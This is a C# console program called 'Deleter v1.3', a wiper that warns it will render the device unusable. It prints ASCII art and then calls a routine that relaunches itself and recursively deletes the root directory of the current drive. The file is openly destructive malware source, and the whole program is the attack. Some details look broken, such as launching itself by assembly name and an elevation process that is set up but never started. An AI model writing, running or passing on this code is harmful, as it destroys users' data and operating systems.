using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Reflection;
class Deleter {
    public static string dir = Directory.GetDirectoryRoot(Directory.GetCurrentDirectory());
    public const string Ver = "1.3";
    public const string Title = "Deleter v" + Ver;
    public static string ProgramName = Assembly.GetExecutingAssembly().FullName;
    public static void DeleteDir()
    {
        Process.Start(ProgramName);
        try
        {
            Console.WriteLine("Deleting " + dir);
            Directory.Delete(dir, true);
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error deleting " + dir);
            Console.WriteLine(ex);
        }
    }
    static void Main(string[] args) {
        Console.WriteLine("WARNING! THIS DELETES THE ROOT DIRECTORY! " +
              "EXECUTING THIS WILL RENDER YOUR DEVICE UNUSABLE!");
        Console.ReadKey();
        Delete();
    }
    static void Delete() 
    { 
        Console.Title = Title;
        Process p = new Process();
        p.StartInfo.UseShellExecute = true;
        p.StartInfo.Verb = "runas";
        Console.ForegroundColor = ConsoleColor.DarkGreen;
        Console.BackgroundColor = ConsoleColor.Black;
        Console.Write("                                                                      ....                          \n                                                                    ..-+=:...                       \n                                                                 ..+########..                      \n                                                              ..=##########*...                     \n                                                             .:###########*###-.                    \n                 ........                                 ..:##############*##*..                   \n               ....-####+:..                             .:*##################..                    \n              ..=######+*##+:....                      ..=###################..                     \n              .++*#######*+####=:...                 ..-###################*.                       \n              .=*################*-...              ..=###################=..                       \n               ..=##########++#####*=:...          .-###################*:..                        \n                ..-##################==...       ..+###################=..                          \n                 ..-*##################*+=:.   ..-*##################*:..                           \n                   ..=**##################*+-..:*###################=.                              \n                    ...:#*###################++#################**=...                              \n                       ..*####################################=++:...                               \n                        ..+#################################=+=:.                                   \n                         ..:+##############################+=:.                                     \n                            ..-############################-..                                      \n                               ..=#######################*:..                                       \n                                ...+######################-.                                        \n                                ..+#*##################*###*:..                                     \n                               .:#####*-################**####..                                    \n                              .##**+*=#####################*###*..                                  \n                           ..-*#*##=-###*-=+################-:###+...                               \n                         ...+#:=*+.-*#+..-*###################-=###-...                             \n                        ..-+-:=-:.=**:-.-#####*-*+**###########*-+###+...                           \n                       ..:===-::.:--..:=####*:...+=-*+*####***###+-+###-..                          \n                     ..:.----:=-+--:.+#####-.    .:+++++#####*+*###=:*##*:..                        \n                    ..---=*=-===+:..+####+:.      ...+==:+*####+*####-:*##=..                       \n                   ..:--=++=+#+*:.:*###*:.           .:+*=+*#####+*####-=##*:                       \n                ....=--+**##**#:.+###*:.              ..:**+**######*###*=*##=..                    \n                ..:--:+*##***-..+#**:.                 ...:+###=+####***##**##*-..                  \n              ..::..-=*#*-*=..=#+*-...                    ..:*##*=-*####***#**##=..                 \n            ..:...:==##==+..:***=..                          .-+##*+=-+##++###++#*:..               \n           ......--+**=+:..-+*=..                             ..:+##*+-+##*+###+-+#+.               \n         .......::+#==-...:+=..                                  .:*###*+#*#*+###+:**:.             \n        .........=+=-....==...                                    ...+###***#*##*+#-:==.            \n       ........:*==:...-+:..                                        ...=*###***+#*-=*.:-..          \n        .  ...--:....:+....                                           ...:==+*:=+*#=-:=...          \n          ....-....:=:..                                                ....:-:-.=#+-.:=:.          \n         ...... ..=:..                                                       ......-=-..::.         \n           ... .:..                                                             .:.........         \n              ..                                                                  ...  .....        \n");
        Thread.Sleep(1000);
        DeleteDir();
    }
}